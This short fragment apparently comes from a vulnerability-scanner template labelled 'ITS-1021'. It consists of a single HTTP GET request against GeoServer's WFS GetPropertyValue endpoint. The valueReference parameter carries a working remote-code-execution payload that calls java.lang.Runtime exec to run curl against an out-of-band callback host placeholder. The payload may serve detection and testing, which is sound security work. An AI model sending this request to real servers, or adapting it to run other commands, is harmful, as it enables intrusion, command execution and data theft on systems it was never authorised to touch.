# Vulnerable: ITS-1021
GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames={{name}}&valueReference=exec(java.lang.Runtime.getRuntime(),'curl+{{interactsh-url}}')
